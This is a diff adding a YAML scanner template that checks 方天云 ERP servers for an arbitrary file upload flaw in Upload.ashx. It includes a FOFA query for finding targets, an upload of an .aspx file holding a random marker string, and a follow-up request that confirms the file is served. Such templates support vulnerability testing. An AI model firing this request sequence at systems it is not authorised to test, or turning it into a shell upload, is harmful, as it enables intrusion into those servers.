@@ -1,0 +1,33 @@
+id: poc-yaml-ftyerp-upload-ashx-anyfile-upload
+info:
+  name: 方天云智慧平台系统 Upload.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: ftyerp
+  fofa: body="AjaxMethods.asmx/GetCompanyItem"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /Upload.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX
+  data: '------WebKitFormBoundarySl8siBbmVicABvTX
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundarySl8siBbmVicABvTX--'
+  expression: status_code == 200 && contains(body,".aspx")
+  output:
+  - regex_match(body,"(?P<path>.*).aspx")
+- method: GET
+  path: /UploadFile/CustomerFile/{{.path}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
